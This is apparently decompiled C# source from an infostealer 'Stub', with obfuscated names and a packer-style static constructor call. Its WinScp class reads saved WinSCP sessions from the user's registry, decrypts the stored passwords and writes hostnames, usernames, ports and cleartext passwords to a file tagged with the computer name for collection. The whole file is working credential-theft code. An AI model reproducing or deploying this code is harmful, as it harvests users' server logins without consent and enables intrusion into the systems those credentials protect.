using System;
using System.Collections.Generic;
using System.IO;
using dg3ypDAonQcOidMs0w;
using Microsoft.Win32;

namespace Stub
{
	// Token: 0x020000D8 RID: 216
	public static class WinScp
	{
		// Token: 0x06000359 RID: 857 RVA: 0x0001FEFC File Offset: 0x0001E0FC
		public static DataExtractionStructs.WinScpInfo[] GetInfo()
		{
			object obj = Utils.ReadRegistryKeyValue(RegistryHive.CurrentUser, "Software\\Martin Prikryl\\WinSCP 2\\Configuration\\Security", "UseMasterPassword");
			DataExtractionStructs.WinScpInfo[] array;
			if (obj == null || obj.GetType() != typeof(int) || (int)obj == 1)
			{
				array = null;
			}
			else
			{
				List<DataExtractionStructs.WinScpInfo> list = new List<DataExtractionStructs.WinScpInfo>();
				RegistryView[] array2 = new RegistryView[]
				{
					RegistryView.Registry64,
					RegistryView.Registry32
				};
				int i = 0;
				while (i < array2.Length)
				{
					RegistryView registryView = array2[i];
					try
					{
						using (RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, registryView))
						{
							string text = "Software\\Martin Prikryl\\WinSCP 2\\Sessions";
							using (RegistryKey registryKey2 = registryKey.OpenSubKey(text))
							{
								foreach (string text2 in registryKey2.GetSubKeyNames())
								{
									try
									{
										using (RegistryKey registryKey3 = registryKey2.OpenSubKey(text2))
										{
											string text3 = (string)registryKey3.GetValue("HostName");
											if (text3 == null)
											{
												text3 = "";
											}
											string text4 = (string)registryKey3.GetValue("UserName");
											if (text4 == null)
											{
												text4 = "";
											}
											string text5 = (string)registryKey3.GetValue("Password");
											if (text5 == null)
											{
												text5 = "";
											}
											int num = 22;
											object value = registryKey3.GetValue("PortNumber");
											if (value != null)
											{
												num = (int)value;
											}
											if (!string.IsNullOrEmpty(text5))
											{
												text5 = WinScp.DecryptData(text5);
												text5 = text5.Substring(text3.Length + text4.Length);
											}
											if (!string.IsNullOrEmpty(text3) || !string.IsNullOrEmpty(text4) || !string.IsNullOrEmpty(text5))
											{
												list.Add(new DataExtractionStructs.WinScpInfo(text3, num, text4, text5));
												Counter.WinScp = true;
											}
										}
									}
									catch
									{
									}
								}
							}
						}
						goto IL_01F5;
					}
					catch
					{
						goto IL_01F5;
					}
					IL_01EA:
					i++;
					continue;
					IL_01F5:
					if (list.Count > 0)
					{
						break;
					}
					goto IL_01EA;
				}
				array = list.ToArray();
			}
			return array;
		}

		// Token: 0x0600035A RID: 858 RVA: 0x00020190 File Offset: 0x0001E390
		private static int DecryptNextChar(List<string> list)
		{
			int num = 255 ^ ((((int.Parse(list[0]) << 4) + int.Parse(list[1])) ^ 163) & 255);
			list.RemoveRange(0, 2);
			return num;
		}

		// Token: 0x0600035B RID: 859 RVA: 0x000201D8 File Offset: 0x0001E3D8
		private static string DecryptData(string EncryptedData)
		{
			List<string> list = new List<string>();
			for (int i = 0; i < EncryptedData.Length; i++)
			{
				if (EncryptedData[i] == 'A')
				{
					list.Add("10");
				}
				else if (EncryptedData[i] == 'B')
				{
					list.Add("11");
				}
				else if (EncryptedData[i] == 'C')
				{
					list.Add("12");
				}
				else if (EncryptedData[i] == 'D')
				{
					list.Add("13");
				}
				else if (EncryptedData[i] == 'E')
				{
					list.Add("14");
				}
				else if (EncryptedData[i] == 'F')
				{
					list.Add("15");
				}
				else
				{
					list.Add(EncryptedData[i].ToString());
				}
			}
			string text;
			if (list.Count < 2)
			{
				text = null;
			}
			else
			{
				int num = WinScp.DecryptNextChar(list);
				int num2;
				if (num == 255)
				{
					if (list.Count < 2)
					{
						return null;
					}
					WinScp.DecryptNextChar(list);
					if (list.Count < 2)
					{
						return null;
					}
					num2 = WinScp.DecryptNextChar(list);
				}
				else
				{
					num2 = num;
				}
				if (list.Count < 2)
				{
					text = null;
				}
				else
				{
					int num3 = WinScp.DecryptNextChar(list) * 2;
					if (num3 > list.Count)
					{
						text = null;
					}
					else
					{
						list.RemoveRange(0, num3);
						string text2 = "";
						for (int j = 0; j < num2; j++)
						{
							if (list.Count < 2)
							{
								return null;
							}
							text2 += ((char)WinScp.DecryptNextChar(list)).ToString();
						}
						text = text2;
					}
				}
			}
			return text;
		}

		// Token: 0x0600035C RID: 860 RVA: 0x0002039C File Offset: 0x0001E59C
		public static void SaveWinScpDetails()
		{
			string text = DateTime.Now.ToString("yyyy-MM-dd_HH.mm.ss");
			string compname = SystemInfo.Compname;
			string text2 = Paths.InitWorkDir();
			string text3 = Path.Combine(text2, string.Concat(new string[] { "WinScp_", compname, "_", text, ".txt" }));
			try
			{
				DataExtractionStructs.WinScpInfo[] info = WinScp.GetInfo();
				if (info == null || info.Length == 0)
				{
					File.WriteAllText(text3, "No WinSCP sessions found or master password is enabled.");
				}
				else
				{
					List<string> list = new List<string>();
					foreach (DataExtractionStructs.WinScpInfo winScpInfo in info)
					{
						list.Add(winScpInfo.ToString());
						list.Add("");
					}
					File.WriteAllLines(text3, list);
					Console.WriteLine("WinSCP details saved to: " + text3);
				}
			}
			catch (Exception ex)
			{
				File.WriteAllText(text3, "Error retrieving WinSCP details: " + ex.Message);
				Console.WriteLine("Error: " + ex.Message);
			}
		}

		// Token: 0x0600035D RID: 861 RVA: 0x000038AD File Offset: 0x00001AAD
		static WinScp()
		{
			WP6RZJql8gZrNhVA9v.prXoP4RuYp();
		}
	}
}
